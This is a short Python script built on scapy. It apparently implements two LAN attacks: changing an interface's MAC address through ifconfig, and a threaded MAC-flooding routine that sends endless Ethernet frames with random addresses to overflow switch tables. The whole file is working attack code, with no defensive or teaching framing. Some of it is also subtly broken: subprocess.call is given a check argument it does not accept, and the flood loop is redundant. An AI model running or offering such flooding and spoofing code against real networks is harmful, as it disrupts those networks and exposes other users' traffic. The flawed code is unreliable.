from subprocess import call
from time import sleep

from scapy.all import Ether, sendp, IP, RandMAC
import threading


def mac_spoofing(iface: str, mac: str):
    call(['ifconfig', iface, 'down'], check=True)
    call(['ifconfig', iface, 'hw', 'ether', mac], check=True)
    call(['ifconfig', iface, 'up'], check=True)


def mac_flooding_threading(iface: str):
    while True:
        mac_random = RandMAC()
        mac_dst = RandMAC()
        frame = Ether(dst=mac_dst, src=mac_random)
        sendp(frame, inter=float(3) / 1000, iface=iface, loop=True, verbose=False)


def mac_flooding(iface: str):
    attack_flooding = threading.Thread(target=mac_flooding_threading, args=(iface,))
    attack_flooding.start()
    sleep(2)
